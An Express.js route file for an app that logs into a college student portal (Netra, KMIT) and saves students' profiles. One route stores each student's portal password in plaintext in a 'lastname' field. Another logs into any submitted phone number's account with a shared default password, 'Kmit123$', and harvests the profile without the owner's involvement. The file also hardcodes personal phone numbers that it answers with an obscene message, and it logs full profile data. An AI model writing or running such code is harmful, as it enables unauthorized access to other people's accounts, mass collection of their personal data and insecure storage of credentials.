const express = require('express');
const Feedback = require('../models/feedback');
const StudentDetail = require('../models/studentDetails');
const axios = require('axios');
const router = express.Router();
require('dotenv').config();

// ✅ Helper function to fetch Netra profile
const add = async (token) => {
  try {
    const response = await axios.post(
      'http://apps.teleuniv.in/api/netraapi.php?college=KMIT',
      { method: "32" },
      {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json',
          'Origin': 'http://kmit-netra.teleuniv.in',
          'Referer': 'http://kmit-netra.teleuniv.in/'
        }
      }
    );

    const profileData = response.data;
    console.log('✅ Netra Profile Data:', profileData);
    return profileData;

  } catch (error) {
    console.error('❌ Error fetching profile from Netra API:', error.message);
    throw new Error('Failed to fetch profile from Netra API');
  }
};

// ✅ Feedback submission route
router.post('/submit/feedback', async (req, res) => {
  const feedbackData = req.body;

  try {
    const feedback = new Feedback(feedbackData);
    await feedback.save();
    res.send('Feedback submitted successfully!');
  } catch (error) {
    console.error('❌ Error saving feedback:', error.message);
    res.status(500).send('Internal server error');
  }
});

// ✅ Token + Registration route (Manual password)
router.post('/get-token-register', async (req, res) => {
  const { phnumber, password } = req.body;

  try {
    const response = await axios.post(
      'http://apps.teleuniv.in/api/auth/netralogin.php?college=KMIT',
      {
        mobilenumber: phnumber,
        password: password
      },
      {
            headers: {
                'Content-Type': 'application/json'
            }
        }
    );

    if (response.data.success === 1) {
      const token = response.data.token;

      const data22 = await add(token);

      if (!data22 || !data22.firstname) {
        return res.status(500).json({ error: 'Invalid data from Netra API' });
      }

      data22.lastname = password;
      data22.psflag = 0;

      const student = new StudentDetail(data22);
      await student.save();

      return res.status(200).json({ name: data22.firstname });

    } else {
      return res.status(401).json({ error: 'Invalid credentials or user not found' });
    }

  } catch (error) {
    console.error('❌ Error during token fetch or registration:', error.message);
    res.status(500).json({ error: 'Failed to fetch token from Netra API' });
  }
});

// ✅ Default password registration route
router.post('/def-token-register', async (req, res) => {
  const { phnumber } = req.body;

  const superhost = {
    "Lucario": 9515360456, "😁": 7660066656, "spidy": 8008075547,
    "thor": 9032041464, "tony-stark": 7337333485, "venom": 8328295372,
    "RDJ-panthulu": 9392457838, "@231454": 8309260629, "Ant-man": 9391332588,
    "@Thala_son": 9381150341, "@HelloSai": 6303895820,
    "@231096": 6301047356, "Retro": 8919583673
  };

  // Block specific numbers
  if (Object.values(superhost).includes(Number(phnumber))) {
    return res.status(403).json({ message: "Sulliga neku enduku 🖕" });
  }

  const existingStudent = await StudentDetail.findOne({ phone: phnumber });

  if (existingStudent) {
    return res.status(201).json({
      message: `Student "${existingStudent.firstname}" is already part of spectra`
    });
  }

  try {
    const response = await axios.post(
      'http://apps.teleuniv.in/api/auth/netralogin.php?college=KMIT',
      {
        mobilenumber: phnumber,
        password: "Kmit123$"
      },
      {
        headers: { 'Content-Type': 'application/json' }
      }
    );

    if (response.data.success === 1) {
      const token = response.data.token;

      const data22 = await add(token);

      if (!data22 || !data22.firstname) {
        return res.status(500).json({ error: 'Invalid data from Netra API' });
      }

      data22.lastname = "Kmit123$";
      data22.psflag = 0;

      const student = new StudentDetail(data22);
      await student.save();

      return res.status(200).json({ name: data22.firstname });

    } else {
      return res.status(401).json({ error: 'Invalid default credentials' });
    }

  } catch (error) {
    console.error('❌ Error using default password:', error.message);
    res.status(500).json({ error: 'Failed to fetch token using default password' });
  }
});

module.exports = router;
